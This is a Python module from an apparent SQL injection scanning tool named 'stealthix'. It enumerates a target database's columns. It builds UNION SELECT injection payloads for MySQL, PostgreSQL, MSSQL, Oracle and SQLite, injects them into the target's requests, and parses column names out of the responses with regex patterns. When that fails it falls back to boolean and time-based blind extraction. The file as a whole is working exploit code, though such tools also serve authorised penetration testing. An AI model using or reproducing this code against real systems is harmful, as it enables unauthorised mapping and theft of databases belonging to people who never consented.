from __future__ import annotations

from typing import Any

from stealthix.core.session import ScanSession
from stealthix.detection.rest_api import method_uses_body
from stealthix.extraction.base import (
    _apply_injection,
    _extract_values,
    _finalize_collection_result,
    _get_extraction_profile,
    _make_request,
    _merge_results,
    _plugin_family,
    _preferred_extraction_techniques,
    _prepare_payload,
    _record_success,
    _response_entry,
    _result_base,
)
from stealthix.extraction.blind import enumerate_columns_blind
from stealthix.extraction.nosql_extract import enumerate_columns_nosql


def _payloads(dbms: str | None, table: str | None) -> list[str]:
    if dbms in {"mysql", "mariadb", "tidb"} and table:
        return [
            f"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}'--"
        ]
    if dbms in {"postgresql", "cockroachdb"}:
        return ["' UNION SELECT column_name FROM information_schema.columns--"]
    if dbms == "mssql":
        return ["' UNION SELECT name FROM syscolumns--"]
    if dbms == "oracle":
        return ["' UNION SELECT column_name FROM all_tab_columns--"]
    if dbms == "sqlite" and table:
        return [f"' UNION SELECT sql FROM sqlite_master WHERE tbl_name='{table}'--"]
    return [
        "' UNION SELECT column_name FROM information_schema.columns--",
        "' UNION SELECT name FROM syscolumns--",
        "' UNION SELECT column_name FROM all_tab_columns--",
        "' UNION SELECT sql FROM sqlite_master--",
    ]


def enumerate_columns(session: ScanSession, table: str | None = None) -> dict[str, Any]:
    if _plugin_family(session) == "nosql":
        return enumerate_columns_nosql(session, table=table)
    dbms = (session.config.dbms or "").lower()
    default_payloads = _payloads(dbms, table)
    profile = _get_extraction_profile(session, "columns") or {}
    payloads = (
        profile.get("payloads") if isinstance(profile.get("payloads"), list) else default_payloads
    )
    techniques = _preferred_extraction_techniques(session)
    results = _result_base(session, "columns", payloads if "union" in techniques else [])
    results["table"] = table
    results["columns"] = []
    default_patterns = [
        r"\bcolumn[:=\s]+([a-z0-9_]+)",
        r"\bcolumn_name[:=\s]+([a-z0-9_]+)",
        r"create\s+table\s+\w+\s*\(([^)]+)\)",
    ]
    patterns = (
        profile.get("patterns") if isinstance(profile.get("patterns"), list) else default_patterns
    )
    if "union" in techniques:
        for payload in payloads if isinstance(payloads, list) else []:
            prepared = _prepare_payload(session, payload)
            if method_uses_body(session.config.method):
                target, data = _apply_injection(session, prepared)
                body, elapsed = _make_request(session, target, data, "POST")
            else:
                target, _ = _apply_injection(session, prepared)
                body, elapsed = _make_request(session, target)
            results["responses"].append(_response_entry(target, prepared, body, elapsed))
            extracted = _extract_values(body, patterns)
            if dbms == "sqlite":
                parsed = []
                for chunk in extracted:
                    if "," in chunk:
                        parts = [seg.strip() for seg in chunk.split(",")]
                        for part in parts:
                            name = part.split()[0].strip('"`[]')
                            if name:
                                parsed.append(name)
                extracted = parsed or extracted
            if extracted:
                _record_success(results, prepared)
                results["columns"].extend(extracted)
        results = _finalize_collection_result(results, "columns")
        if results["success"]:
            results["technique"] = "union"
            return results

    merged = results
    for technique in techniques:
        if technique not in {"boolean", "time"}:
            continue
        blind_result = enumerate_columns_blind(session, technique=technique, table=table)
        merged = _merge_results(results, blind_result)
        if blind_result.get("success"):
            return merged
    return merged
